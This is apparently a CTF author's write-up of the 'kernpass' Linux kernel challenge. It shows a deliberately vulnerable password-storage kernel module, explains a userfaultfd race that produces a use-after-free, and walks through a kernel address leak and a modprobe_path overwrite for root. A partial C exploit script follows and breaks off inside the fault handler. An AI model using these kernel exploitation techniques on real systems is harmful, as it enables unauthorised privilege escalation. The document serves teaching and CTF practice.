+<p>Kernpass is a kernel pwn challenge. This is the first time I make a kernel pwn challegne, so it actually cost me so much time on compiling kernel, busybox and kernel module debugging. To be honest, this is the very time for me to create a kernel pwnchallenge, amount of terrible permission misconfiguration leads to several unintended solution. I apologize for that.</p>
+<p>This challnege is a very classic &ldquo;note-liked&rdquo; heap challenge, it might be easy for the kernel pwn player. You may find that the challenge called &ldquo;kernpass&rdquo; but there are not any encryption or endcoding elements inside. In fact, in the very early stages of the idea, I did want to implement a complex encryption system on it. However, I found it difficult to solve on my own :( and the hard deadline is coming soon. So I keep it simple.</p>
+<p>I think it is a light work for kernel pwn player to reverse it, so I decided to provide the kernel module only.</p>
+<p>Here is the source code of the kernel module:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/cdev.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/random.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/slab.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/uaccess.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+MODULE_AUTHOR(<span style="color:#e6db74">&#34;botton&#34;</span>);
+MODULE_DESCRIPTION(<span style="color:#e6db74">&#34;kernpass&#34;</span>);
+
+<span style="color:#75715e">#define DEVICE_NAME &#34;kernpass&#34;
+</span><span style="color:#75715e">#define ADD_PW 0x13370001 
+</span><span style="color:#75715e">#define CHK_PW 0x13370002
+</span><span style="color:#75715e">#define EDIT_PW 0x13370003
+</span><span style="color:#75715e">#define DEL_PW 0x13370004
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password;
+} request_t;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password;
+} password_entity;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+  password_entity <span style="color:#f92672">*</span>passwords[<span style="color:#ae81ff">0x20</span>];
+} password_list;
+
+password_list<span style="color:#f92672">*</span> main_list;
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add_password</span>(request_t<span style="color:#f92672">*</span> req)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password;
+  password_entity <span style="color:#f92672">*</span>tmp_entity;
+
+  index <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>index;
+  size <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>size;
+  password <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>password;
+
+  <span style="color:#66d9ef">if</span> (index <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">&amp;&amp;</span> size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">512</span>) { 
+
+    tmp_entity <span style="color:#f92672">=</span> (password_entity<span style="color:#f92672">*</span>)kmalloc(<span style="color:#66d9ef">sizeof</span>(password_entity), GFP_KERNEL_ACCOUNT);
+    tmp_entity<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> size;
+    tmp_entity<span style="color:#f92672">-&gt;</span>password <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)kmalloc(size, GFP_KERNEL_ACCOUNT);
+
+    <span style="color:#66d9ef">if</span> (unlikely(copy_from_user(tmp_entity<span style="color:#f92672">-&gt;</span>password, password, size))){
+      kfree(tmp_entity);
+      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+
+    main_list<span style="color:#f92672">-&gt;</span>passwords[index] <span style="color:#f92672">=</span> tmp_entity;
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+  }
+ 
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">check_password</span>(request_t<span style="color:#f92672">*</span> req)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index; 
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password;
+  password_entity <span style="color:#f92672">*</span>tmp_entity;
+
+  index <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>index;
+  password <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>password;
+
+  <span style="color:#66d9ef">if</span> (index <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) { 
+    <span style="color:#66d9ef">if</span> (main_list<span style="color:#f92672">-&gt;</span>passwords[index]){
+      tmp_entity <span style="color:#f92672">=</span> main_list<span style="color:#f92672">-&gt;</span>passwords[index];
+      size <span style="color:#f92672">=</span> tmp_entity<span style="color:#f92672">-&gt;</span>size;
+
+      <span style="color:#66d9ef">if</span> (unlikely(copy_to_user(password, tmp_entity<span style="color:#f92672">-&gt;</span>password, size))){
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+      }
+    } <span style="color:#66d9ef">else</span> {
+      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;;
+  }
+
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">edit_password</span>(request_t<span style="color:#f92672">*</span> req)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password;
+  password_entity <span style="color:#f92672">*</span>tmp_entity;
+
+  index <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>index;
+  password <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>password;
+
+  <span style="color:#66d9ef">if</span> (index <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) { 
+    <span style="color:#66d9ef">if</span> (main_list<span style="color:#f92672">-&gt;</span>passwords[index]){
+
+      tmp_entity <span style="color:#f92672">=</span> main_list<span style="color:#f92672">-&gt;</span>passwords[index];
+      
+      size <span style="color:#f92672">=</span> tmp_entity<span style="color:#f92672">-&gt;</span>size;
+  
+      <span style="color:#66d9ef">if</span> (unlikely(copy_from_user(tmp_entity<span style="color:#f92672">-&gt;</span>password, password, size))){
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+      }
+
+    } <span style="color:#66d9ef">else</span> {
+      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+  }
+
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">delete_password</span>(request_t<span style="color:#f92672">*</span> req)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index;
+
+  index <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>index;
+  <span style="color:#66d9ef">if</span> (index <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) { 
+    kfree(main_list<span style="color:#f92672">-&gt;</span>passwords[index]<span style="color:#f92672">-&gt;</span>password);
+    kfree(main_list<span style="color:#f92672">-&gt;</span>passwords[index]);
+    main_list<span style="color:#f92672">-&gt;</span>passwords[index] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  } <span style="color:#66d9ef">else</span>{
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">module_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>filp) {
+  main_list <span style="color:#f92672">=</span> (password_list<span style="color:#f92672">*</span>)kmalloc(<span style="color:#66d9ef">sizeof</span>(password_list), GFP_KERNEL_ACCOUNT);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">module_close</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>filp) {
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">module_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>filp,
+                         <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> cmd,
+                         <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> arg) {
+  request_t req;
+  <span style="color:#66d9ef">if</span> (unlikely(copy_from_user(<span style="color:#f92672">&amp;</span>req, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)arg, <span style="color:#66d9ef">sizeof</span>(req))))
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+
+  <span style="color:#66d9ef">switch</span> (cmd) {
+    <span style="color:#66d9ef">case</span> ADD_PW: <span style="color:#66d9ef">return</span> add_password(<span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">case</span> CHK_PW: <span style="color:#66d9ef">return</span> check_password(<span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">case</span> EDIT_PW: <span style="color:#66d9ef">return</span> edit_password(<span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">case</span> DEL_PW: <span style="color:#66d9ef">return</span> delete_password(<span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+  }
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file_operations module_fops <span style="color:#f92672">=</span> {
+  .owner   <span style="color:#f92672">=</span> THIS_MODULE,
+  .open    <span style="color:#f92672">=</span> module_open,
+  .release <span style="color:#f92672">=</span> module_close,
+  .unlocked_ioctl <span style="color:#f92672">=</span> module_ioctl
+};
+
+<span style="color:#66d9ef">static</span> dev_t dev_id;
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> cdev c_dev;
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">module_initialize</span>(<span style="color:#66d9ef">void</span>)
+{
+  <span style="color:#66d9ef">if</span> (alloc_chrdev_region(<span style="color:#f92672">&amp;</span>dev_id, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, DEVICE_NAME))
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBUSY;
+
+  cdev_init(<span style="color:#f92672">&amp;</span>c_dev, <span style="color:#f92672">&amp;</span>module_fops);
+  c_dev.owner <span style="color:#f92672">=</span> THIS_MODULE;
+
+  <span style="color:#66d9ef">if</span> (cdev_add(<span style="color:#f92672">&amp;</span>c_dev, dev_id, <span style="color:#ae81ff">1</span>)) {
+    unregister_chrdev_region(dev_id, <span style="color:#ae81ff">1</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBUSY;
+  }
+
+  main_list <span style="color:#f92672">=</span> (password_list<span style="color:#f92672">*</span>)kmalloc(<span style="color:#66d9ef">sizeof</span>(password_list), GFP_KERNEL_ACCOUNT);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">module_cleanup</span>(<span style="color:#66d9ef">void</span>)
+{
+  cdev_del(<span style="color:#f92672">&amp;</span>c_dev);
+  unregister_chrdev_region(dev_id, <span style="color:#ae81ff">1</span>);
+}
+
+module_init(module_initialize);
+module_exit(module_cleanup);
+
+</code></pre></div><h2 id="vulnerability">Vulnerability</h2>
+<p>The intended vulnerability of the challenge is race condition to cause UAF.
+We can see it has not implemented mutex in the source code and it enabled userfaultfd for normal user from <code>/init</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#ae81ff">1</span> &gt; /proc/sys/vm/unprivileged_userfaultfd
+</code></pre></div><h2 id="uaf---leak-kernel-address">UAF - Leak kernel address</h2>
+<p>We can follow the following steps to leak kernel address</p>
+<p>Thread 1:</p>
+<ol>
+<li>Create a 0x20 size password, password #0</li>
+<li>register a uffd page</li>
+<li>Check password #0 using the uffd page to trigger page fault</li>
+</ol>
+<p>Thread 2 start:</p>
+<ol start="4">
+<li>Delete password #0</li>
+<li>Spray <code>seq_operations</code> <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations">kmalloc-32 heap spray</a></li>
+</ol>
+<p>Thread 2 end, thread 1 continue</p>
+<p>It return the data of <code>seq_operations</code> struture which reveal the kernel address. We can calculate the kernel base address by finding the offset manuelly.</p>
+<h2 id="uaf---arbitrary-address-write-primitive-aaw">UAF - Arbitrary Address Write Primitive (AAW)</h2>
+<p>As the structure size of password_entity 0x10, we are able to retrieve AAW through heap chunk overlapping.</p>
+<p>Thread 1:</p>
+<ol>
+<li>Create a 0x10 size password, password #0</li>
+<li>register a uffd page</li>
+<li>Edit password #0 using the uffd page to trigger page fault and prepare the address to write data in</li>
+</ol>
+<p>Thread 2 start:</p>
+<ol start="4">
+<li>Delete password #0</li>
+<li>Create two 0x20 size password, password #2 &amp; #3</li>
+</ol>
+<p>Thread 2 end, thread 1 continue</p>
+<ol start="6">
+<li>The pointer in password #3 will be overwritten with the address that we prepared in step3</li>
+</ol>
+<p>The easiest way to become root with knowing kernel base address and having AAW is to modify modprobe_path.</p>
+<p>Therefore, we put our path to modprobe_path address by AAW to exploit it and get the flag.</p>
+<h2 id="exploit-script-1">Exploit Script</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define _GNU_SOURCE
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/userfaultfd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;poll.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ipc.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define ADD_PW 0x13370001 
+</span><span style="color:#75715e">#define CHK_PW 0x13370002
+</span><span style="color:#75715e">#define EDIT_PW 0x13370003
+</span><span style="color:#75715e">#define DEL_PW 0x13370004
+</span><span style="color:#75715e"></span>
+cpu_set_t pwn_cpu;
+<span style="color:#66d9ef">int</span> fd;
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kheap;
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kbase;
+
+<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>page;
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf;
+<span style="color:#66d9ef">int</span> uffd_stage <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+<span style="color:#66d9ef">int</span> spray[<span style="color:#ae81ff">0x50</span>];
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password;
+} request_t;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password;
+} password_entity;
+
+<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+  password_entity <span style="color:#f92672">*</span>passwords[<span style="color:#ae81ff">0x20</span>];
+} password_list;
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add_password</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pw){
+    <span style="color:#75715e">//printf(&#34;ADD\n&#34;);
+</span><span style="color:#75715e"></span>    request_t req;
+    memset(<span style="color:#f92672">&amp;</span>req, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#66d9ef">sizeof</span>(request_t));
+    req.index <span style="color:#f92672">=</span> index;
+    req.size <span style="color:#f92672">=</span> size;
+    req.password <span style="color:#f92672">=</span> pw;
+    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> ioctl(fd, ADD_PW, <span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) die(<span style="color:#e6db74">&#34;Add&#34;</span>);
+    <span style="color:#75715e">//printf(&#34;Created #%d\n&#34;, ret);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> ret;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">check_password</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pw){
+    <span style="color:#75715e">//printf(&#34;ADD\n&#34;);
+</span><span style="color:#75715e"></span>    request_t req;
+    memset(<span style="color:#f92672">&amp;</span>req, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#66d9ef">sizeof</span>(request_t));
+    req.index <span style="color:#f92672">=</span> index;
+    req.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    req.password <span style="color:#f92672">=</span> pw;
+    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> ioctl(fd, CHK_PW, <span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) die(<span style="color:#e6db74">&#34;check password&#34;</span>);
+    <span style="color:#75715e">//printf(&#34;Created #%d\n&#34;, ret);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> ret;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">edit_password</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pw){
+    <span style="color:#75715e">//printf(&#34;ADD\n&#34;);
+</span><span style="color:#75715e"></span>    request_t req;
+    memset(<span style="color:#f92672">&amp;</span>req, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#66d9ef">sizeof</span>(request_t));
+    req.index <span style="color:#f92672">=</span> index;
+    req.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    req.password <span style="color:#f92672">=</span> pw;
+    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> ioctl(fd, EDIT_PW, <span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) die(<span style="color:#e6db74">&#34;EDIT&#34;</span>);
+    <span style="color:#75715e">//printf(&#34;Created #%d\n&#34;, ret);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> ret;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">delete_password</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> index){
+    <span style="color:#75715e">//printf(&#34;ADD\n&#34;);
+</span><span style="color:#75715e"></span>    request_t req;
+    memset(<span style="color:#f92672">&amp;</span>req, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#66d9ef">sizeof</span>(request_t));
+    req.index <span style="color:#f92672">=</span> index;
+    req.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    req.password <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> ioctl(fd, DEL_PW, <span style="color:#f92672">&amp;</span>req);
+    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) die(<span style="color:#e6db74">&#34;RESET&#34;</span>);
+    <span style="color:#75715e">//printf(&#34;Created #%d\n&#34;, ret);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> ret;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">die</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>text){                
+    printf(<span style="color:#e6db74">&#34;Die: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, text);
+    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+} 
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hexdump</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>target, <span style="color:#66d9ef">int</span> size){                
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>size<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span>){                 
+      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)(target<span style="color:#f92672">+</span>(i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>){
+        printf(<span style="color:#e6db74">&#34;0x%x: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)(target<span style="color:#f92672">+</span>(i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)));    
+      }                              
+    }                                                                                                
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">uffd_stage1</span>(){
+  puts(<span style="color:#e6db74">&#34;[+] UAF read&#34;</span>);
+  delete_password(<span style="color:#ae81ff">0</span>);   
+
+  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x50</span>; i<span style="color:#f92672">++</span>){
+    seq_open();
+  }
+
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">uffd_stage2</span>(){
+
+  puts(<span style="color:#e6db74">&#34;[+] UAF write&#34;</span>);
+
+  delete_password(<span style="color:#ae81ff">0</span>);   
+
+  add_password(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20</span>, buf);  
+  add_password(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x20</span>, buf);  
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">fault_handler_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>dummy_page;
+  <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> uffd_msg msg;
+  <span style="color:#66d9ef">struct</span> uffdio_copy copy;
+  <span style="color:#66d9ef">struct</span> pollfd pollfd;
+  <span style="color:#66d9ef">long</span> uffd;
+  <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> fault_cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+  uffd <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)arg;
+
+  dummy_page <span style="color:#f92672">=</span> mmap(NULL, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE,
+                    MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">if</span> (dummy_page <span style="color:#f92672">==</span> MAP_FAILED) die(<span style="color:#e6db74">&#34;mmap(dummy)&#34;</span>);
+
+  puts(<span style="color:#e6db74">&#34;[+] fault_handler_thread: waiting for page fault...&#34;</span>);
+  pollfd.fd <span style="color:#f92672">=</span> uffd;
+  pollfd.events <span style="color:#f92672">=</span> POLLIN;
+
+  <span style="color:#66d9ef">while</span> (poll(<span style="color:#f92672">&amp;</span>pollfd, <span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+    <span style="color:#66d9ef">if</span> (pollfd.revents <span style="color:#f92672">&amp;</span> POLLERR <span style="color:#f92672">||</span> pollfd.revents <span style="color:#f92672">&amp;</span> POLLHUP)
+      die(<span style="color:#e6db74">&#34;poll&#34;</span>);
+
+    <span style="color:#75715e">/* Trigger page fault */</span>
